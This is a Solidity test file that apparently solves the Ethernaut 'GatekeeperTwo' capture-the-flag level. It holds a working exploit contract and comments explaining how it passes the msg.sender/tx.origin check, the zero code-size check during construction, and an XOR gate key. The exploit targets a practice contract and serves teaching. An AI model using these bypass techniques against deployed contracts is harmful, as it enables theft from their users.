// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperTwo.sol";
import "src/levels/GatekeeperTwoFactory.sol";

contract TestGatekeeperTwo is BaseTest {
    GatekeeperTwo private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new GatekeeperTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperTwo(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // SOLVE gateOne() check:
        // To solve the gateOne barrier we need to have `msg.sender != tx.origin`
        // If we have an external contract to call the `GatekeeperOne` contract
        // for us in that case `msg.sender === ExploiterContract` but
        // `tx.origin === playerAddress`

        // SOLVE gateTwo() check:
        // A contract has two different bytes codes when compiled
        // The creation bytecode and the runtime bytecode
        // The runtime bytecode is the real code of the contract, the one stored in the blockchain
        // The creation bytecode is the bytecode needed by Ethereum to create the contract and execute the constructor only once
        // When the constructor is executed initializing the contract storage it returns the runtime bytecode
        // Until the very end of the constructor the contract itself does not have any runtime bytecode
        // So if you call address(contract).code.length it will return 0!
        // If you want to read more about this at EVM level: https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/
        // For this reason to pass the second gate we just need to call `enter` from the `Exploiter` constructor!

        // SOLVE gateThree() check:
        // We are talking again about converting between types and bit wise operations
        // Let's look at the requirement
        // `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1`
        // The contract is compiled with a Solidity version prior to 0.8.x so it will not revert for underflow math
        // uint64(0) - 1 is underflowing and is like saying "give me the max value that uint64 can represent"
        // bytes8(keccak256(abi.encodePacked(msg.sender))) is taking the less important 8 bytes from the `msg.sender` (that is the Exploiter contract in this case)
        // and casting them to a uint64
        // a ^ b is the bit wise XOR operation
        // The XOR operation works like this: if the bit in the position are equal it will result in a 0 otherwise in a 1
        // in order to make a ^ b = type(uint64).max (so all 1) `b` must be the inverse of `a`
        // it means that our `gateKey` must be the inverse of `bytes8(keccak256(abi.encodePacked(msg.sender)))`
        // Inside our Exploiter we define contractByte8 as `bytes8(keccak256(abi.encodePacked(address(this))))`
        // and the gateKey is equalt to contractByte8 ^ 0xFFFFFFFFFFFFFFFF
        // In solidity there's no "inverse" operation but we can recreate it by doing the XOR between our input and a value with only `F`s

        vm.prank(player, player);
        new Exploiter(level);

        assertEq(level.entrant(), player);
    }
}

contract Exploiter {
    address private owner;

    constructor(GatekeeperTwo victim) public {
        owner = msg.sender;

        bytes8 contractByte8 = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 gateKey = contractByte8 ^ 0xFFFFFFFFFFFFFFFF;

        victim.enter(gateKey);
    }
}
